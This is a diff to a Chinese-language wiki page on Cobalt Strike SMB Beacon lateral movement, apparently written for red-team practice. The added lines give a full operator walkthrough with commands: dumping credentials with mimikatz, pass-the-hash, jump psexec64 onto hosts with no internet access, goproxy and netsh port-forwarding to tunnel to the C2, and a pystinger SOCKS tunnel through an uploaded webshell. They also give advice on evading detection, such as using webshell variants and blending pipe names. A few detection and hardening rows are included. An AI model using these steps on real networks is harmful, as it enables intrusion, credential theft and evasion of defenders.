@@ -1,9 +1,9 @@
 ---
 title: Cobalt Strike External C2 规范与 SMB Beacon 实战详解
 description: 深度解析 Cobalt Strike 核心架构细节：Team Server 与 Beacon 交互模型、Staging 分阶段加载机制、心跳包特征、多
-  Team Server 分布式协作模型，并结合 External C2 通信规范、SMB Beacon 基于命名管道的横向移动实战流程、流量融合技巧及主机/网络层面检测对抗策略。补充
-  0x727 Aggressor Script 工具包中 SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生、阿里云 C2 反射 DLL
-  更新等 C2 基础设施隐匿技术。
+  Team Server 分布式协作模型，并结合 External C2 通信规范、SMB Beacon 基于命名管道的横向移动实战流程（含凭据抓取、SMB Listener
+  建立、psexec 横向上线不出网主机、∞∞ 标识判断）、HTTP/SOCKS 代理替代方案、流量融合技巧及主机/网络层面检测对抗策略。补充 0x727 Aggressor
+  Script 工具包中 SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生、阿里云 C2 反射 DLL 更新等 C2 基础设施隐匿技术。
 category: program-analysis
 tags:
 - Cobalt Strike
@@ -33,13 +33,16 @@ tags:
 - FRP
 - Bloodhound
 - Mimikatz
+- goproxy
+- pystinger
+- Port Proxy
 date: 2024-01-15
 updated: '2026-11-15'
 ---
 
 ## 概述
 
-Cobalt Strike 4.0+ 引入 **External C2** 规范，允许红队通过自定义通信通道（如 SMB、HTTP、DNS、云存储等）隐蔽地传输 Beacon 流量。其中 **SMB Beacon** 利用 Windows 命名管道封装于 SMB 协议，实现**无需目标机器直连互联网**即可通过已控主机（父 Beacon）跳板上线的横向移动能力。本页系统梳理其核心架构细节（Team Server 与 Beacon 交互模型、Staging 分阶段加载机制、心跳包特征、多 Team Server 分布式协作模型）、协议原理、实战操作链路、流量融合思路及蓝队检测视角，**并补充 0x727 团队开源的 Aggressor Script 工具包中 SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生、阿里云 C2 反射 DLL 更新等 C2 基础设施隐匿技术实现细节**。
+Cobalt Strike 4.0+ 引入 **External C2** 规范，允许红队通过自定义通信通道（如 SMB、HTTP、DNS、云存储等）隐蔽地传输 Beacon 流量。其中 **SMB Beacon** 利用 Windows 命名管道封装于 SMB 协议，实现**无需目标机器直连互联网**即可通过已控主机（父 Beacon）跳板上线的横向移动能力。本页系统梳理其核心架构细节、协议原理、实战操作链路（含 ∞∞ 标识判断要点）、代理替代方案、流量融合思路及蓝队检测视角，**并补充 0x727 团队开源的 Aggressor Script 工具包中 SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生、阿里云 C2 反射 DLL 更新等 C2 基础设施隐匿技术实现细节**。
 
 > 交叉引用：[[smb-named-pipe-c2-communication]] 已系统梳理 SMB 协议与命名管道原理、Cobalt Strike SMB Beacon 架构、主机/网络层面检测手段及缓解措施，可作配套参考。
 > 交叉引用：[[0x727-cobalt-strike-aggressor-script-toolkit]] 记录 0x727 团队开源的 Cobalt Strike Aggressor Script 工具包全功能清单，含 Mimikatz、Bloodhound、FRP、PrintSpooler、atexec、SpawnReflectiveC2 等模块。
@@ -406,7 +409,9 @@ command spawn_reflective_c2 {
 
 ---
 
-## SMB Beacon 实战操作链路
+## SMB Beacon 实战操作链路（含 ∞∞ 标识判断）
+
+> 以下流程基于实战归档文章《不出网主机上线方法》整理，环境：DMZ 主机 (Win2008 R2, 双网卡 192.168.111.132/192.168.204.188) 作为 Parent，内网主机 (Win2012, 192.168.204.141) 作为 Target，C2 (Kali, 192.168.111.129)。
 
 ### 前置条件
 
@@ -418,37 +423,122 @@ command spawn_reflective_c2 {
 
 ### 标准操作步骤
 
+#### 获取 Parent Beacon 并抓取凭据
+
+在 DMZ 主机 (Web Server) 上线 CS 后，使用 Mimikatz 抓取明文密码或 Hash。
+
 ```text
-# 1. 探测内网 445 端口
-beacon> portscan 172.31.51.0/24 445
+beacon> run mimikatz
+# 或使用 0x727 工具包集成的一键导出模块
+```
+> 交叉引用：[[mimikatz-source-code-architecture-golden-ticket-audit]] 详细解析 sekurlsa::logonpasswords 实现原理。
+
+#### 建立 SMB Listener (Bind Pipe)
+
+在 Cobalt Strike 客户端：`Cobalt Strike` -> `Listeners` -> `Add`。
+- **Payload**: `Windows/64` (或 x86)
+- **Listener Type**: `SMB (Bind Pipe)`
+- **Bind Pipe Name**: 默认 `msagent_<Random>`，建议在 Malleable Profile 中自定义 `stage.pipe_name` 为合法管道名（如 `lsarpc`, `samr`, `eventlog` 等）以融合基线。
+- **Port**: 445 (默认)
+
+#### 利用 psexec 进行横向移动 (jump psexec64)
+
+在 Parent Beacon 交互控制台执行：
+
+```text
+# 1. 探测内网 445 端口 (可选)
+beacon> portscan 192.168.204.0/24 445
 
 # 2. 建立 SMB 会话并填充令牌 (Pass-the-Hash / 明文密码均可)
-beacon> shell net use \\172.31.51.190\admin$ /user:"administrator" "test1234@"
-# 或使用 pth
-beacon> pth 172.31.51.190 administrator <NTLM_HASH>
+beacon> shell net use \\192.168.204.141\admin$ /user:"administrator" "test1234@"
+# 或使用 pth (需 administrator 权限)
+beacon> pth 192.168.204.141 administrator <NTLM_HASH>
 
-# 3. 横向生成 SMB Beacon (jump psexec64)
-beacon> jump psexec64 172.31.51.190 smb
+# 3. 横向生成 SMB Beacon
+beacon> jump psexec64 192.168.204.141 smb
 # 参数说明：目标IP + payload 类型 (smb 即 bind_pipe)
-
-# 4. 会话管理：断开与恢复
-# 断开 (父/子会话均可执行)
-beacon> unlink 172.31.51.190 <Child_Beacon_PID>
-# 恢复 (从任意 Beacon 连接)
-beacon> link 172.31.51.190 msagent_<Random>
 ```
 
 > **关键点**：
 > - `jump psexec64` 底层利用 **服务控制管理器 (SCM)** 远程创建服务启动 Payload，服务二进制内嵌 **Named Pipe Client** 逻辑连回 Parent 的 `bind_pipe` 监听器。
+> - **凭据必须为 Administrator 权限**，否则 SCM 创建服务失败 (Access Denied)。
 > - 默认管道名 `msagent_<Random>`，可在 Malleable C2 Profile 中通过 `stage.pipe_name` 自定义。
-> - `unlink` 后 Child Beacon **不退出**，转入 **监听模式**，等待后续 `link` 恢复控制。
 
-### 进阶：凭据获取与横向扩展
+#### 连接成功判断：∞∞ 标识
 
-- 配合 [[mimikatz-source-code-architecture-golden-ticket-audit]] 中的 `sekurlsa::logonpasswords` 或 `lsadump::sam` 导出目标凭据。
-- 利用 `jump psexec64` 批量推进，结合 `portscan`/`net view` 构建内网拓扑。
+**核心判断要点**：横向成功后，在 Cobalt Strike Beacon 列表视图中，**子 Beacon (SMB Beacon) 所在行的右侧会显示 `∞∞` 标识**（类似无限符号叠加），表示该会话通过命名管道链路连接，而非直接连接 Team Server。
 
-> 交叉引用：[[vulnhub-doubletrouble-writeup]] 展示了从 Shellshock 获取初立足点到 Dirty COW 提权的完整链路，思路可迁移至 “初立足点 → 凭据窃取 → SMB Beacon 横向” 的红队标准作业程序。
+![SMB Beacon 上线 ∞∞ 标识示意](../Images/0fac9f413a33e12c0038b6ebcf31c599.png)
+*(注：原文截图显示 smb beacon 上线的主机右侧有 ∞∞ 标识)*
+
+#### 会话管理：断开与恢复 (link/unlink)
+
+- **断开链路** (父/子会话均可执行，子 Beacon 不退出，转入监听模式)：
+  ```text
+  beacon> unlink 192.168.204.141 <Child_Beacon_PID>
+  # 或在父 Beacon: unlink <Child_Beacon_ID>
+  ```
+- **恢复链路** (从任意 Beacon 连接)：
+  ```text
+  beacon> link 192.168.204.141 msagent_<Random>
+  ```
+
+---
+
+## 替代方案：不出网主机的代理上线策略
+
+当 SMB 445 端口不通、或无 Administrator 凭据、或需更隐蔽的流量特征时，可采用 HTTP/SOCKS 代理将内网流量转发至 Parent 再出网。
+
+### 方案一：goproxy + netsh 端口代理 (HTTP 代理)
+
+#### 原理
+在 Parent (DMZ 主机) 部署 goproxy 开启 HTTP 代理端口 (如 8080)，利用 Windows 原生 `netsh interface portproxy` 将内网网卡的特定端口 (如 822) 转发至公网网卡的 goproxy 端口 (8080)。Target 通过内网 IP:822 访问，实质经 Parent 出网到 C2。
+
+#### 实战步骤
+
+1. **Parent 部署 goproxy**：
+   ```cmd
+   # 上传 proxy.exe 到 DMZ 主机
+   shell C:\proxy.exe http -t tcp -p :8080
+   ```
+2. **配置 netsh 端口转发** (需管理员权限)：
+   ```cmd
+   # 监听内网 IP 192.168.204.188 的 822 端口，转发至公网 IP 192.168.111.132 的 8080 端口
+   shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080
+   ```
+   *验证*：`netstat -ano | findstr :822`
+3. **C2 创建 HTTP Listener**：
+   - Host: `192.168.204.188` (DMZ 内网 IP)
+   - Port: `822`
+   - **关键**：勾选 `Proxy` 或在 Profile 中配置 HTTP 代理行为，或直接利用 Stageless Payload 指向该地址。
+4. **生成 Stageless Payload 上线**：
+   - 原因：Target 无法直连 C2 下载 Stage，需使用包含完整逻辑的 Stageless (Artifact -> Windows Executable S)。
+   - 执行上传运行，流向：`Target(192.168.204.141) -> DMZ_Internal(192.168.204.188:822) -> DMZ_Public(192.168.111.132:8080) -> C2(192.168.111.129)`。
+
+> **Stage vs Stageless**：Stager 分阶段加载需目标能直连 Staging Server 下载 Stage；Stageless 体积大但自包含，适合仅能访问代理跳板的场景。
+
+### 方案二：pystinger 搭建 SOCKS4 代理
+
+#### 原理
+服务端由 Webshell (`proxy.php`) + `stinger_server.exe` 构成。Webshell 负责流量转发 (HTTP 隧道)，`stinger_server.exe` 在内存中建立 SOCKS4 代理服务。Client 端 (`stinger_client`) 连接 Webshell，本地开启 SOCKS4 端口供工具 (如 CS、MSF) 使用。
+
+#### 实战步骤
+
+1. **Target/Web Server 部署**：
+   - 上传 `proxy.php` 至 Web 目录 (访问返回 `UTF-8` 正常)。
+   - 上传 `stinger_server.exe` 并执行：`start stinger_server.exe 0.0.0.0` (默认监听 1080 或指定端口)。
+2. **C2/Kali 启动 Client**：
+   ```bash
+   ./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000
+   # 本地 60000 开启 SOCKS4 代理
+   ```
+3. **CS 创建 Listener 配置 SOCKS 代理**：
+   - Host: `192.168.204.188` (DMZ 内网 IP)
+   - Port: `60020` (或自定义转发端口，需配合 `stinger_server` 配置)
+   - 实际上是 CS 通过本地 SOCKS 代理 (60000) 连接 Target。
+4. **横向上线**：使用 `jump psexec64` 选择该 Listener，Target 上线。
+
+> 优势：流量封装在 HTTP (Webshell) 中，边界防火墙仅见 Web 访问；SOCKS4 支持 TCP 转发，兼容性强。
 
 ---
 
@@ -493,6 +583,7 @@ beacon> link 172.31.51.190 msagent_<Random>
 | **非业务时间段 445 激增** | 防火墙/NDR | `time NOT IN business_hours AND count(445) > baseline * 3` |
 | **JA3/JA3S 指纹异常** | TLS 指纹库 | `JA3S 匹配已知 Cobalt Strike 默认指纹 (未使用 Malleable Profile 时)` |
 | **域前置异常** | TLS 拦截/代理日志 | `SNI 指向高信誉域名 (cdn.xxx.com) 但 HTTP Host 头不同`、`证书颁发者为云厂商 CA 但流量特征异常` |
+| **HTTP 代理/隧道异常** | Web Proxy/NDR | `CONNECT 方法频繁、User-Agent 固定、目标 IP 为内网 DMZ 机器非标准端口 (822, 8080)` |
 
 ### 缓解与加固措施
 
@@ -503,6 +594,7 @@ beacon> link 172.31.51.190 msagent_<Random>
 5. **审计策略**：启用 `Audit File Share` (Event ID 5140/5145) 记录共享访问。
 6. **EDR/NDR**：部署行为分析引擎识别 “进程打开大量管道”、“System 进程发起网络连接”、 **反射式加载器内存操作模式**、 **域前置 TLS 指纹异常** 等异常模式。
 7. **证书透明度监控**：订阅 CT 日志，监控针对组织域名、云厂商域名签发的异常证书。
+8. **Netsh 端口代理审计**：定期枚举 `netsh interface portproxy show all`，排查未授权转发规则。
 
 ---
 
@@ -519,6 +611,8 @@ beacon> link 172.31.51.190 msagent_<Random>
 | **SpawnReflectiveC2 x86 兼容性问题** | **Cobalt Strike 4.0 判断进程位数缺陷，x64 目标上 x86 反射加载器可能失效** | **编译 x64 版反射加载器与 Stage DLL；或使用 WoW64 兼容模式显式指定架构；测试环境验证后再实战部署** |
 | **域前置证书验证失败** | 云厂商 CDN 强制证书绑定、SNI 校验、证书透明度强制 | 使用云厂商托管证书、配置 Malleable Profile `ssl_verify` 策略、选择支持自定义证书的 CDN 服务 |
 | **阿里云 C2 备案/实名限制** | 国内云服务需域名备案、实名认证、API 调用频控 | 提前完成备案、使用企业实名账号、设计低频心跳策略、备用多云厂商方案 |
+| **goproxy/netsh 端口转发失效** | 防火墙拦截、IP 地址变更、端口冲突 | 使用 `netsh advfirewall` 放行、脚本化部署确保幂等、监控转发规则存活 |
+| **pystinger Webshell 被查杀** | 静态特征匹配、流量行为分析 | 使用变种 Webshell、流量加密/混淆、限制访问频率与来源 IP |
 
 ---
 
@@ -535,6 +629,7 @@ beacon> link 172.31.51.190 msagent_<Random>
 | **红队基建自动化** | [RedWarden](https://github.com/mgeeky/RedWarden) / [C2Concealer](https://github.com/FortyNorthSecurity/C2Concealer) | 重定向器、CDN、证书自动化部署 |
 | **反射加载器参考** | [ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) / [sRDI](https://github.com/monoxgas/sRDI) | 经典反射 DLL 注入实现 |
 | **域前置实战指南** | [DomainFronting](https://github.com/vysec/DomainFronting) | 域前置技术文档与工具 |
+| **代理工具** | [goproxy](https://github.com/snail007/goproxy) / [pystinger](https://github.com/whwlsfb/pystinger) | 文中实战使用的 HTTP/SOCKS 代理工具 |
 
 ---
 
@@ -544,10 +639,11 @@ beacon> link 172.31.51.190 msagent_<Random>
 - **心跳特征**：默认通过 **HTTP Cookie** 传输高熵 Base64 加密元数据，周期性强，是核心网络指纹；可通过 Malleable Profile 深度伪装。
 - **External C2** 将 C2 通信协议**解耦**，赋予红队“协议即代码”的灵活性。
 - **SMB Beacon** 利用 **TCP 445 + 命名管道** 的默认放行特性，实现**内网免出站上线**，是横向移动核心手段。
-- **实战核心链路**：凭据获取 → `net use`/`pth` 建立会话 → `jump psexec64 smb` 落地 → `link/unlink` 会话复用。
+- **实战核心链路**：凭据获取 → `net use`/`pth` 建立会话 → `jump psexec64 smb` 落地 → **观察 ∞∞ 标识确认 SMB 链路** → `link/unlink` 会话复用。
+- **替代代理方案**：`goproxy + netsh portproxy` (HTTP 转发) 与 `pystinger` (SOCKS4 over Webshell) 解决无 Administrator 凭据或 445 不通场景下的不出网上线需求，**Stageless Payload** 是关键。
 - **0x727 工具包增强**：集成 **SpawnReflectiveC2** 实现 **反射 DLL 注入 + 域前置** 的 C2 派生能力，支持 **阿里云等云厂商基础设施** 定制化反射 DLL，结合 **PrintSpooler、atexec、FRP、Mimikatz、Bloodhound** 形成完整红队工具链，显著提升 C2 基础设施隐匿性与生存周期。
 - **流量融合** 应优先复用目标合法业务基础设施（云盘、协作软件、内部共享、**云厂商 CDN/网关**），降低异常流量指纹。
-- **蓝队防御** 需构建 **主机基线 (Sysmon 17/18 + 反射加载器行为) + 网络基线 (Zeek/NDR + 域前置 TLS 指纹) + 主动阻断 (防火墙/EDR)** 的纵深体系。
+- **蓝队防御** 需构建 **主机基线 (Sysmon 17/18 + 反射加载器行为) + 网络基线 (Zeek/NDR + 域前置 TLS 指纹 + 代理异常检测) + 主动阻断 (防火墙/EDR/Netsh 审计)** 的纵深体系。
 
 ---
 
@@ -568,10 +664,8 @@ beacon> link 172.31.51.190 msagent_<Random>
 
 --- 
 
-*本页面基于微信公众号文章《攻防对抗中的C2架构解析》整理，结合 Cobalt Strike 官方文档、External C2 规范、**0x727 团队微信归档文章《Cobalt Strike Aggressor Script 工具包分享》** 及实战经验扩充。如有技术细节更新，欢迎 PR 修正。*
+*本页面基于微信公众号文章《攻防对抗中的C2架构解析》整理，结合 Cobalt Strike 官方文档、External C2 规范、**0x727 团队微信归档文章《Cobalt Strike Aggressor Script 工具包分享》** 及实战文章《不出网主机上线方法》扩充。如有技术细节更新，欢迎 PR 修正。*
 
 ## 来源
 
-- [0x00实验室-202108-202304_033](../sources/0x00实验室-202108-202304_033.md)
-- [0x727 微信归档文章：Cobalt Strike Aggressor Script 工具包分享](../sources/0x727_aggressor_script_toolkit.md)
-- [0x727开源安全团队-202108-202110_6](../sources/0x727开源安全团队-202108-202110_6.md)
+- [0xfafu攻防实验室-202010-202112_08](../sources/0xfafu攻防实验室-202010-202112_08.md)
